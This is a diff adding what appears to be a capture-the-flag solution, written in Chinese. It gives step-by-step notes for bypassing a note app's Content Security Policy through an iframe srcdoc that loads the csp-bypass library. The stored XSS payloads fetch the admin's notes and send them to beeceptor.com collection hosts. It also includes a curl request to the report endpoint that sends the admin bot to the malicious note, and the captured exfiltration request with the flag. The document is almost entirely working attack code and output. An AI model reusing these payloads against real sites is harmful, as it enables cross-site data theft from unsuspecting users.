@@ -1,0 +1,60 @@
+第一步： OK ! 
+<iframe srcdoc="<script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script><br csp=alert(1)>"></iframe>
+
+第二步： 
+fetch(`/api/notes/all`)
+    .then(r=>r.text())
+    .then(
+        f=>location=`https://lambo.free.beeceptor.com/?${f}`
+    )
+第三步：
+<iframe srcdoc="<script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script><br csp='fetch(`/api/notes/all`).then(r=>r.text()).then(data=>setTimeout(()=>top.location.href=`https://wille.free.beeceptor.com/?${data}`,900))'>"></iframe>
+拿到的資料：
+[{%22author%22:%22admin%22,%22id%22:%22a83ed14e-8c1c-43c3-ad7a-b5393ad85a3d%22,%22title%22:%22FLAG1%22}]
+
+第四步：
+<iframe srcdoc="<script src='https://unpkg.com/csp-bypass/dist/sval-classic'></script><br csp='fetch(`/api/notes?id=a83ed14e-8c1c-43c3-ad7a-b5393ad85a3d`).then(r=>r.text()).then(r=>top.location.href=`https://wille.free.beeceptor.com/?${r}`)'>"></iframe>
+
+第五步：
+在/api/notes/all底下知道自己剛剛第四步寫的note的id
+
+第六步：
+curl 'http://10.113.184.121:10082/report' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: session=eyJ1c2VybmFtZSI6IndpbGx5d2lsbHkifQ.ZZQBRw.qrw8mO5HAU5bd498yHJUXivk2FE' \
+  -H 'Origin: http://10.113.184.121:10082' \
+  -H 'Referer: http://10.113.184.121:10082/note?id=c716a36f-a2cf-49ff-9fc5-df1f258e2a4d' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \
+  --data-raw 'note_id=你自己寫XSS拿到flag的noteid&author=你自己的名稱' \
+  --compressed \
+  --insecure
+
+或是隨便創一個note, 然後點進去將那個note將form Report裡原先的noteid改成第五步拿到的noteid, 然後按report也可以
+
+拿到的資料：
+curl --request GET \
+--url https://wille.free.beeceptor.com/?{%22author%22:%22admin%22,%22content%22:%22FLAG{byp4ss1ing_csp_and_xsssssssss}%22,%22title%22:%22FLAG1%22} \
+--header 'host: wille.free.beeceptor.com' \
+--header 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.109 Safari/537.36' \
+--header 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+--header 'accept-encoding: gzip, deflate, br' \
+--header 'referer: http://web:5000/' \
+--header 'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "HeadlessChrome";v="120"' \
+--header 'sec-ch-ua-mobile: ?0' \
+--header 'sec-ch-ua-platform: "Linux"' \
+--header 'sec-fetch-dest: document' \
+--header 'sec-fetch-mode: navigate' \
+--header 'sec-fetch-site: cross-site' \
+--header 'upgrade-insecure-requests: 1' \
+--header 'x-forwarded-for: 60.248.184.74' \
+--header 'x-forwarded-host: wille.free.beeceptor.com' \
+--header 'x-forwarded-proto: https' \
+--header 'x-real-ip: 60.248.184.74'
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
